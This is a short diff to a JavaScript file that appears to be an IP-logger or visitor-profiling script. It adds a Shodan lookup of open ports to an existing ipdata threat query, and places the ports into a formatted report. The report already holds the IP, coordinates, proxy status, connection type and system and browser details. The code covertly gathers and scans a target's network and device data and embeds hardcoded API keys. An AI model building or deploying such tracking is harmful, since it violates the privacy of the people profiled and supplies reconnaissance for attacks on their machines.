@@ -127,6 +127,12 @@ fetch('https://api.ipdata.co/' + ip + '/threat?api-key=d2bc3795e24c5db7c7117376a
     let isProxy = data.is_proxy;
     let isAnonymous = data.is_anonymous;
 
+
+fetch('https://api.shodan.io/shodan/host/' + ip + '?key=D5FJgrGr49WhZIoPaZGHVCCWp2QvXmaT')
+.then(response => response.json())
+.then(data => {
+  const ports = data.data.ports;
+
         const message = `
 *🔎 ip*
 *├ IP: ${ip}*
@@ -141,7 +147,9 @@ fetch('https://api.ipdata.co/' + ip + '/threat?api-key=d2bc3795e24c5db7c7117376a
 *├ Coordinates: ${longitude} ${latitude},*
 *├ TLD: ${tld}*
 *├ Version: ${versian}*
+*├ Ports: ${ports}*
 *└ Internet: ${TypeInternet}*
+
 
     
  *💻 System*
@@ -188,6 +196,7 @@ fetch('https://api.ipdata.co/' + ip + '/threat?api-key=d2bc3795e24c5db7c7117376a
       });
     });
   });
+});
 });
         
 function getBrowserInfo() {
